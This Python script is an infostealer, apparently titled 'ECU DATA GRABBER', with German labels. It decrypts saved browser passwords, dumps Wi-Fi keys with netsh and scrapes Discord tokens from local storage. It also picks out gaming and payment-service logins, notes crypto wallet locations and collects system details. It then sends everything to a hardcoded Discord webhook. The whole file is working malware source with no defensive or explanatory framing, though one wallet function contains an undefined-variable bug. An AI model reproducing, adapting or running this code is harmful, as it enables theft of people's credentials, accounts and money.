import os
import sqlite3
import json
import requests
import base64
import win32crypt
import platform
import socket
import subprocess
import re
from Cryptodome.Cipher import AES
import shutil

def get_master_key(browser_path):
    try:
        local_state_path = os.path.join(browser_path, "..", "Local State")
        local_state_path = os.path.abspath(local_state_path)
        
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]
        
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

def decrypt_password(encrypted_password, key=None):
    try:
        if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)
            return decrypted[:-16].decode()
        else:
            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
    except:
        return None

def get_browser_data():
    browsers = {
        'Chrome': os.path.expanduser('~') + '/AppData/Local/Google/Chrome/User Data/Default',
        'Edge': os.path.expanduser('~') + '/AppData/Local/Microsoft/Edge/User Data/Default',
        'Brave': os.path.expanduser('~') + '/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default',
        'Opera': os.path.expanduser('~') + '/AppData/Roaming/Opera Software/Opera Stable',
        'Opera GX': os.path.expanduser('~') + '/AppData/Roaming/Opera Software/Opera GX Stable',
        'Vivaldi': os.path.expanduser('~') + '/AppData/Local/Vivaldi/User Data/Default'
    }
    
    all_logins = {}
    
    for browser, path in browsers.items():
        try:
            if not os.path.exists(path):
                continue
                
            key = get_master_key(path)
            if not key:
                continue
                
            login_db = os.path.join(path, 'Login Data')
            if not os.path.exists(login_db):
                continue
                
            temp_db = "temp_login.db"
            shutil.copy2(login_db, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''")
            
            browser_logins = []
            for url, username, pwd in cursor.fetchall():
                if pwd:
                    decrypted = decrypt_password(pwd, key)
                    if decrypted:
                        browser_logins.append({
                            'url': url,
                            'username': username,
                            'password': decrypted
                        })
            
            if browser_logins:
                all_logins[browser] = browser_logins
            
            conn.close()
            if os.path.exists(temp_db):
                os.remove(temp_db)
                
        except:
            continue
    
    return all_logins

def steal_wifi_passwords():
    try:
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors='ignore').split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        wifi_data = {}
        for profile in profiles:
            try:
                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8', errors='ignore').split('\n')
                password = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                security = [b.split(":")[1][1:-1] for b in results if "Authentication" in b]
                if password: 
                    wifi_data[profile] = {
                        'password': password[0],
                        'security': security[0] if security else 'Unknown'
                    }
            except: 
                pass
        return wifi_data
    except:
        return {}

def get_system_info():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        
        wlan_info = subprocess.check_output(['netsh', 'wlan', 'show', 'interfaces']).decode('utf-8', errors='ignore')
        ssid_line = [line for line in wlan_info.split('\n') if 'SSID' in line and 'BSSID' not in line]
        current_ssid = ssid_line[0].split(':')[1].strip() if ssid_line else "Nicht verbunden"
        
        return {
            'hostname': hostname,
            'os': platform.system() + " " + platform.release(),
            'username': os.getlogin(),
            'processor': platform.processor(),
            'local_ip': local_ip,
            'current_wifi': current_ssid,
            'architecture': platform.architecture()[0]
        }
    except:
        return {
            'hostname': socket.gethostname(),
            'os': platform.system() + " " + platform.release(),
            'username': os.getlogin()
        }

def get_discord_data():
    discord_data = {}
    discord_paths = [
        os.path.expanduser('~') + '/AppData/Roaming/discord',
        os.path.expanduser('~') + '/AppData/Local/Discord'
    ]
    
    # Browser-Daten nach Discord Logins durchsuchen
    browser_data = get_browser_data()
    discord_logins = {}
    
    for browser, logins in browser_data.items():
        discord_logins[browser] = []
        for login in logins:
            if 'discord.com' in login['url'].lower() or 'discordapp.com' in login['url'].lower():
                discord_logins[browser].append({
                    'url': login['url'],
                    'username': login['username'],
                    'password': login['password']
                })
    
    for path in discord_paths:
        if os.path.exists(path):
            try:
                login_info = {
                    'installation_path': path,
                    'email': 'In Local Storage gespeichert',
                    'password': 'Verschlüsselt gespeichert',
                    'tokens': []
                }
                
                # Tokens suchen
                for root, dirs, files in os.walk(path):
                    if 'Local Storage' in root and 'leveldb' in root:
                        for file in files:
                            if file.endswith('.ldb') or file.endswith('.log'):
                                file_path = os.path.join(root, file)
                                try:
                                    with open(file_path, 'r', errors='ignore') as f:
                                        content = f.read()
                                        # Token-Muster
                                        token_pattern = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}'
                                        found_tokens = re.findall(token_pattern, content)
                                        if found_tokens:
                                            login_info['tokens'] = found_tokens
                                except:
                                    pass
                
                discord_data[os.path.basename(path)] = login_info
            except:
                discord_data[os.path.basename(path)] = {
                    'installation_path': path,
                    'status': 'Installation gefunden'
                }
    
    # Browser-Logins hinzufügen
    if any(len(logins) > 0 for logins in discord_logins.values()):
        discord_data['browser_logins'] = discord_logins
    
    return discord_data

def get_telegram_data():
    telegram_path = os.path.expanduser('~') + '/AppData/Roaming/Telegram Desktop'
    if os.path.exists(telegram_path):
        return {
            "Telegram": {
                'installation_path': telegram_path,
                'session': 'Aktiv',
                'phone_number': 'In tdata gespeichert',
                'email': 'Mit Konto verknüpft'
            }
        }
    return {}

def get_gaming_logins():
    launchers = {
        'Steam': {
            'path': os.path.expanduser('~') + '/AppData/Local/Steam',
            'config': os.path.expanduser('~') + '/AppData/Local/Steam/config/loginusers.vdf',
            'login_data': 'Benutzername/Email in Konfiguration'
        },
        'Epic Games': {
            'path': os.path.expanduser('~') + '/AppData/Local/EpicGamesLauncher',
            'config': os.path.expanduser('~') + '/AppData/Local/EpicGamesLauncher/Saved/Config/Windows',
            'login_data': 'Email in Launcher-Daten'
        },
        'Ubisoft': {
            'path': os.path.expanduser('~') + '/AppData/Local/Ubisoft Game Launcher',
            'config': os.path.expanduser('~') + '/AppData/Local/Ubisoft Game Launcher/settings.yml',
            'login_data': 'Ubisoft Connect Login'
        },
        'Minecraft Launcher': {
            'path': os.path.expanduser('~') + '/AppData/Roaming/.minecraft',
            'config': os.path.expanduser('~') + '/AppData/Roaming/.minecraft/launcher_profiles.json',
            'login_data': 'Microsoft/Xbox Login'
        }
    }
    
    # Browser-Daten nach Gaming Logins durchsuchen
    browser_data = get_browser_data()
    gaming_logins = {}
    
    gaming_domains = ['steam', 'epicgames', 'ubisoft', 'minecraft', 'xbox', 'playstation', 'origin', 'battle.net']
    
    for browser, logins in browser_data.items():
        gaming_logins[browser] = []
        for login in logins:
            if any(domain in login['url'].lower() for domain in gaming_domains):
                gaming_logins[browser].append({
                    'url': login['url'],
                    'username': login['username'],
                    'password': login['password']
                })
    
    found = {}
    for launcher, info in launchers.items():
        if os.path.exists(info['path']):
            login_data = {
                'installation_path': info['path'],
                'status': 'Installiert',
                'login_type': info['login_data'],
                'email': 'In Launcher gespeichert',
                'password': 'Verschlüsselt gespeichert'
            }
            
            # Minecraft Profil-Daten
            if launcher == 'Minecraft Launcher' and os.path.exists(info['config']):
                try:
                    with open(info['config'], 'r') as f:
                        minecraft_data = json.load(f)
                        if 'authenticationDatabase' in minecraft_data:
                            profiles = []
                            for profile_id, profile_data in minecraft_data['authenticationDatabase'].items():
                                if 'profiles' in profile_data:
                                    for profile_name, profile_info in profile_data['profiles'].items():
                                        profiles.append({
                                            'profile': profile_name,
                                            'type': profile_info.get('type', 'Unknown')
                                        })
                            if profiles:
                                login_data['minecraft_profiles'] = profiles
                except:
                    pass
            
            found[launcher] = login_data
    
    # Browser-Logins hinzufügen
    if any(len(logins) > 0 for logins in gaming_logins.values()):
        found['browser_logins'] = gaming_logins
    
    return found

def get_payment_logins():
    payment_services = {
        'PayPal': ['paypal.com', 'paypal'],
        'Amazon Pay': ['amazonpay', 'amazon.com/payments'],
        'Stripe': ['stripe.com'],
        'eBay': ['ebay.com', 'ebay'],
        'Shopify': ['shopify.com'],
        'Klarna': ['klarna.com'],
        'Adyen': ['adyen.com'],
        'Square': ['square.com', 'squareup.com']
    }
    
    # Browser-Daten nach Payment-Diensten durchsuchen
    browser_data = get_browser_data()
    payment_logins = {}
    
    for service, domains in payment_services.items():
        service_logins = []
        for browser, logins in browser_data.items():
            for login in logins:
                if any(domain in login['url'].lower() for domain in domains):
                    service_logins.append({
                        'browser': browser,
                        'url': login['url'],
                        'username': login['username'],
                        'password': login['password']
                    })
        
        if service_logins:
            payment_logins[service] = service_logins
    
    return payment_logins

def get_email_clients():
    clients = {
        'Outlook': {
            'path': os.path.expanduser('~') + '/AppData/Local/Microsoft/Outlook',
            'profiles': 'Mehrere Profile möglich',
            'email': 'In Profilen gespeichert',
            'password': 'Windows Credential Manager'
        },
        'Thunderbird': {
            'path': os.path.expanduser('~') + '/AppData/Roaming/Thunderbird',
            'profiles': 'Profil.ini mit Emails',
            'email': 'In Profil-Dateien',
            'password': 'Verschlüsselt gespeichert'
        }
    }
    
    found = {}
    for client, info in clients.items():
        if os.path.exists(info['path']):
            found[client] = {
                'installation_path': info['path'],
                'email': info['email'],
                'password': info['password'],
                'profiles': info['profiles']
            }
    return found

def find_crypto_wallets():
    wallet_paths = {
        'MetaMask': os.path.expanduser('~') + '/AppData/Roaming/MetaMask',
        'Exodus': os.path.expanduser('~') + '/AppData/Roaming/Exodus',
        'Electrum': os.path.expanduser('~') + '/AppData/Roaming/Electrum',
        'Trust Wallet': os.path.expanduser('~') + '/AppData/Local/Trust Wallet',
        'Atomic Wallet': os.path.expanduser('~') + '/AppData/Roaming/Atomic Wallet',
        'Coinbase Wallet': os.path.expanduser('~') + '/AppData/Local/Coinbase Wallet',
        'Binance Chain Wallet': os.path.expanduser('~') + '/AppData/Local/BinanceChainWallet'
    }
    
    wallets_found = {}
    for wallet_name, wallet_path in wallet_paths.items():
        if os.path.exists(wallet_path):
            wallets_found[walname] = {
                'path': wallet_path,
                'status': 'Wallet gefunden',
                'private_keys': 'In Wallet-Dateien gespeichert',
                'recovery_phrase': 'In Konfiguration'
            }
    return wallets_found

def send_to_webhook(all_data, webhook_url):
    embeds = []
    
    # Browser Passwörter
    browser_count = sum(len(logins) for logins in all_data.get('browser_passwords', {}).values())
    embeds.append({
        "title": f"🌐 BROWSER PASSWÖRTER ({browser_count} Logins)",
        "description": f"```json\n{json.dumps(all_data.get('browser_passwords', {}), indent=2, ensure_ascii=False)}\n```",
        "color": 15105570
    })
    
    # WLAN Passwörter
    wifi_count = len(all_data.get('wifi_passwords', {}))
    embeds.append({
        "title": f"📶 WLAN PASSWÖRTER ({wifi_count} Netzwerke)",
        "description": f"```json\n{json.dumps(all_data.get('wifi_passwords', {}), indent=2, ensure_ascii=False)}\n```",
        "color": 3447003
    })
    
    # System Information
    embeds.append({
        "title": "💻 SYSTEM & NETZWERK INFORMATIONEN",
        "description": f"```json\n{json.dumps(all_data.get('system_info', {}), indent=2, ensure_ascii=False)}\n```",
        "color": 10181046
    })
    
    # Crypto Wallets
    crypto_count = len(all_data.get('crypto_wallets', {}))
    embeds.append({
        "title": f"💰 CRYPTO WALLETS ({crypto_count} gefunden)",
        "description": f"```json\n{json.dumps(all_data.get('crypto_wallets', {}), indent=2, ensure_ascii=False)}\n```",
        "color": 15844367
    })
    
    # Discord Data
    discord_count = len(all_data.get('discord_data', {}))
    embeds.append({
        "title": f"📱 DISCORD LOGINS & TOKENS ({discord_count} Installationen)",
        "description": f"```json\n{json.dumps(all_data.get('discord_data', {}), indent=2, ensure_ascii=False)}\n```",
        "color": 5793266
    })
    
    # Telegram Data
    telegram_count = len(all_data.get('telegram_data', {}))
    embeds.append({
        "title": f"📨 TELEGRAM DATA ({telegram_count} gefunden)",
        "description": f"```json\n{json.dumps(all_data.get('telegram_data', {}), indent=2, ensure_ascii=False)}\n```",
        "color": 2303786
    })
    
    # Gaming Logins
    gaming_count = len(all_data.get('gaming_logins', {}))
    embeds.append({
        "title": f"🎮 GAMING LOGINS ({gaming_count} Launcher)",
        "description": f"```json\n{json.dumps(all_data.get('gaming_logins', {}), indent=2, ensure_ascii=False)}\n```",
        "color": 12745742
    })
    
    # Payment Logins
    payment_count = sum(len(logins) for logins in all_data.get('payment_logins', {}).values())
    embeds.append({
        "title": f"💳 PAYMENT LOGINS ({payment_count} Accounts)",
        "description": f"```json\n{json.dumps(all_data.get('payment_logins', {}), indent=2, ensure_ascii=False)}\n```",
        "color": 3066993
    })
    
    # Email Clients
    email_count = len(all_data.get('email_clients', {}))
    embeds.append({
        "title": f"📧 EMAIL CLIENTS ({email_count} Clients)",
        "description": f"```json\n{json.dumps(all_data.get('email_clients', {}), indent=2, ensure_ascii=False)}\n```",
        "color": 7419530
    })
    
    payload = {
        "content": "🚨 **ECU DATA GRABBER - ALLE SYSTEMDATEN** 🚨",
        "embeds": embeds
    }
    
    try:
        response = requests.post(webhook_url, json=payload, timeout=30)
        return True
    except Exception as e:
        return False

if __name__ == "__main__":
    webhook_url = "https://discord.com/api/webhooks/1423690187585622186/vnRLSxijChUHb_Ft1GQsDMHcr0mbTRq-7TFCHo5y__p7xdznRkfjGDegwuByJGrshrQ9"
    
    all_data = {
        'browser_passwords': get_browser_data(),
        'wifi_passwords': steal_wifi_passwords(),
        'system_info': get_system_info(),
        'crypto_wallets': find_crypto_wallets(),
        'discord_data': get_discord_data(),
        'telegram_data': get_telegram_data(),
        'gaming_logins': get_gaming_logins(),
        'payment_logins': get_payment_logins(),
        'email_clients': get_email_clients()
    }
    
    send_to_webhook(all_data, webhook_url)